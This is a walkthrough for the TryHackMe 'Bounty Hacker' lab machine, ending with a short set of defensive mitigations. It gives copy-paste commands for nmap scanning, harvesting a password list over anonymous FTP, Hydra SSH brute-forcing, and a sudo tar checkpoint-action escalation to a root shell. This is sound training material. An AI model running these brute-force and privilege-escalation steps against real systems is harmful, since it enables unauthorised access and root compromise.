# Bounty Hacker — Consolidated Walkthrough

> **Difficulty:** Easy → Medium  
> **Platform:** Linux / Web / Privilege Escalation  
> **Goal:** Capture `user` and `root` flags on the TryHackMe *Bounty Hacker* machine.

---

## Table of Contents

1. [Summary](#summary)
2. [High-level Attack Flow](#high-level-attack-flow)
3. [Prereqs & Tools](#prereqs--tools)
4. [Step-by-step Walkthrough](#step-by-step-walkthrough)
    - [1 — Recon (nmap)](#1---recon-nmap)
    - [2 — Anonymous FTP & files (locks.txt / task.txt)](#2---anonymous-ftp--files-lockstxt--tasktxt)
    - [3 — Web enumeration](#3---web-enumeration)
    - [4 — SSH brute-force using harvested credentials](#4---ssh-brute-force-using-harvested-credentials)
    - [5 — Low-privilege enumeration on shell](#5---low-privilege-enumeration-on-shell)
    - [6 — Privilege escalation via `tar` (GTFOBins pattern)](#6---privilege-escalation-via-tar-gtfobins-pattern)
5. [Cheat-sheet — Commands (copy/paste)](#cheat-sheet---commands-copypaste)
6. [Defensive Notes & Mitigations](#defensive-notes--mitigations)
7. [References](#references)

---

## Summary

This box is a classic beginner-friendly ADJ (web + service) challenge:  
- Discover **anonymous FTP** containing a password list (`locks.txt`) and task hints.  
- Use those passwords to brute-force SSH (Hydra) against discovered usernames.  
- Log in as a low-privilege user, then escalate to root using an allowed `sudo tar` command and a well-known [GTFOBins](https://gtfobins.github.io/) exploitation technique.

---

## High-level Attack Flow

1. **nmap** → Find services (FTP, SSH, HTTP).
2. Connect to **anonymous FTP**, download `locks.txt` and `task.txt`.
3. Enumerate web app, build username list from site content and `task.txt`.
4. Use **hydra** to brute-force SSH usernames with `locks.txt`. Obtain valid user creds.
5. SSH in, run `sudo -l` and enumerate; discover `sudo` allowed for `tar`.
6. Exploit `tar` via GTFOBins technique to spawn root shell and capture `/root/root.txt`.

---

## Prereqs & Tools

- **Attacker box:** Kali / Parrot / Ubuntu
- **Tools:**  
  `nmap`, `ftp`/`lftp`/`curl`, `gobuster` (optional), `hydra` (or `medusa` / `patator`), `ssh`, `socat`/`nc`, `python3` for simple shells, [GTFOBins](https://gtfobins.github.io/) as reference.
- **Wordlists:**  
  `locks.txt` (from FTP), `rockyou.txt` (if needed), small user lists.

---

## Step-by-step Walkthrough

### 1 — Recon (nmap)

Scan for open ports and services:

```bash
nmap -sC -sV -p- -T4 -oA bounty_nmap <TARGET_IP>
```

Look for:
- `21/tcp` — FTP (anonymous likely allowed)
- `22/tcp` — SSH
- `80/tcp` — Web server / info page

---

### 2 — Anonymous FTP & files (locks.txt / task.txt)

Connect to FTP anonymously and list files:

```bash
ftp <TARGET_IP>
# or
ncftpls ftp://<TARGET_IP>/
```

Download the interesting files:

```bash
get locks.txt
get task.txt
```

---

### 3 — Web enumeration

Visit the web page (`http://<TARGET_IP>/`) for candidate usernames.  
Optionally, use `gobuster` to check for hidden paths:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,html,txt
```

Build `users.txt` from names found on the page and in `task.txt`.

---

### 4 — SSH brute-force using harvested credentials

Brute-force SSH using the password and username lists:

```bash
hydra -L users.txt -P locks.txt ssh://<TARGET_IP> -t 4 -f
```

Hydra will report valid credentials when found.

> **Tip:** Try manual combos from `task.txt` if brute-force is slow.

---

### 5 — Low-privilege enumeration on shell

SSH in with discovered credentials:

```bash
ssh user@<TARGET_IP>
```

Check environment and sudo permissions:

```bash
id
whoami
pwd
ls -la
sudo -l
ps aux
cat /etc/passwd
```

`sudo -l` should show `/usr/bin/tar` allowed as root (NOPASSWD).

---

### 6 — Privilege escalation via `tar` (GTFOBins pattern)

Exploit `tar` for root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

After root shell:

```bash
whoami
cat /root/root.txt
```

---

## Cheat-sheet — Commands (copy/paste)

```bash
# Recon
nmap -sC -sV -p- -T4 -oA bounty_nmap <TARGET_IP>

# FTP (anonymous)
ftp <TARGET_IP>
# username: anonymous  password: <press Enter>
get locks.txt
get task.txt

# Web enumeration (optional)
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,html,txt

# Bruteforce SSH with hydra
hydra -L users.txt -P locks.txt ssh://<TARGET_IP> -t 4 -f

# SSH to target
ssh user@<TARGET_IP>

# On shell: check sudo allowed commands
sudo -l

# If tar is allowed:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# After root shell:
whoami
cat /root/root.txt
```

---

## Defensive Notes & Mitigations

- **Disable anonymous FTP** or restrict it to safe directories. Remove credential lists.
- **Limit `sudo` usage:** Avoid `NOPASSWD` for powerful binaries. Use wrappers and audit `sudoers`.
- **Harden SSH:** Rate-limit, block brute-force, use key-based auth, monitor failed attempts.
- **File hygiene:** Never store passwords in plaintext on network services.
- **Monitor for suspicious `tar`/GTFOBins usage:** Alert on `--checkpoint-action` or unusual invocations.

---

## References

- “Bounty Hacker Write-up” (InfoSec / Medium repost) — FTP → `locks.txt` → `hydra` → `sudo tar` → root flow.
- GitHub — community repos with example steps and scripts for *Bounty Hacker*.
- GTFOBins — [tar abuse pattern](https://gtfobins.github.io/) for privilege escalation.

---